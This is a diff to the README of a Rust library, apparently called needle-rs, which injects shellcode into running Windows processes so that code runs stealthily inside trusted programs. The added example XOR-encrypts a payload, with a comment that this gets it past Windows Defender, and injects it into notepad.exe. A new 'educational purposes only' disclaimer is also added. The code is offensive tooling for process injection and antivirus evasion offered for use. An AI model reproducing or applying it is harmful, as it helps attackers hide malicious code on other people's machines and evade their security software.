@@ -13,17 +13,25 @@ Allows for running "malicious" code stealthily within the context of trusted pro
 needle = { git = "https://github.com/Swiiz/needle-rs.git", features = [ "windows" ] }
 ```
 ```RUST
-use needle::{find_process, inject, Payload};
+use needle::{
+    cypher::{PayloadCypher, XorCypher},
+    find_process, inject, Shellcode,
+};
 
 const SHELL_CODE: &[u8] = include_bytes!("YOUR_PAYLOAD.bin");
+const KEY: u8 = 0x42;
 
 fn main() {
-    let payload = Payload::from(SHELL_CODE);
-    let process = find_process("YOUR_TARGET_PROCESS.exe").expect("Target process not found");
-    if let Err(e) = inject(process, payload) {
+    let payload = XorCypher::<Shellcode>::from_encrypted(SHELL_CODE, KEY); // The payload is encrypted one time using  XorCypher -> Allows for bypassing windows defender on my machine
+
+    let process = find_process("notepad.exe").expect("Target process not found"); // Find a process with the name "notepad.exe"
+    if let Err(e) = inject(process, payload) { // Inject the payload
         println!("Could not inject payload: {}", e);
     }
 }
-```
 
-### If anyone is interested in implementing other platforms/methods, please feel free to contribute 👍
+```
+**If anyone is interested in implementing other platforms/methods/cyphers, please feel free to contribute 👍**
+
+## Disclaimer
+Information and code provided on this repository are for educational purposes only. The creator is in no way responsible for any direct or indirect damage caused due to the misuse of the information.
